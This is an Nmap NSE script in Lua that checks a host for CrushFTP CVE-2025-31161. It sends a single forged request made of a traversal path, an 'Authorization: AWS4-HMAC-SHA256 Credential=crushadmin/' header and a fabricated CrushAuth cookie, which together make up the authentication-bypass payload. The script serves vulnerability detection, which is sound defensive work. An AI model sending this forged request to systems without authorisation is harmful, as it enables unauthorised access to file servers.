local nmap      = require "nmap"
local shortport = require "shortport"

description = [[
Detects CrushFTP CVE-2025-31161 via a single forged HTTP request over a raw socket.
Guaranteed one-line result: VULNERABLE or NOT VULNERABLE.
]]

author     = "Mohamed Trigui"
license    = "Same as Nmap—see https://nmap.org/book/man-legal.html"
categories = {"safe","vuln"}

-- Adjust port if your CrushFTP listens elsewhere.
portrule = shortport.portnumber(8080)

-- Build a 44-byte CrushAuth cookie: <13-digit epoch ms>_<30 hex chars>
local function make_cookie()
  local epoch = tostring(os.time() * 1000)
  local h = {}
  for i = 1, 30 do h[i] = ("%x"):format(math.random(0,15)) end
  return epoch .. "_" .. table.concat(h)
end

action = function(host, port)
  -- 1) Open a raw TCP socket
  local sock = nmap.new_socket()
  sock:set_timeout(5000)
  local ok, err = sock:connect(host.ip, port.number)
  if not ok then
    return ("ERROR: could not connect: %s"):format(err)
  end

  -- 2) Send a single GET for robots.txt with the PoC headers
  local req = table.concat({
    "GET /WebInterface/function/UNC/x/../../robots.txt HTTP/1.1",
    ("Host: %s:%d"):format(host.ip, port.number),
    "User-Agent: Nmap Raw Socket",
    "Authorization: AWS4-HMAC-SHA256 Credential=crushadmin/",
    "Cookie: CrushAuth=" .. make_cookie(),
    "Connection: close",
    "", ""
  }, "\r\n")
  sock:send(req)

  -- 3) Read exactly the status line back
  local status_line = sock:receive()
  sock:close()

  local code = tonumber((status_line or ""):match("^HTTP/%d+%.%d+ (%d%d%d)")) or 0

  -- 4) Print the verdict
  if code == 200 then
    return ("CrushFTP CVE-2025-31161: VULNERABLE (HTTP %d)"):format(code)
  else
    return ("CrushFTP CVE-2025-31161: NOT VULNERABLE (HTTP %d)"):format(code)
  end
end

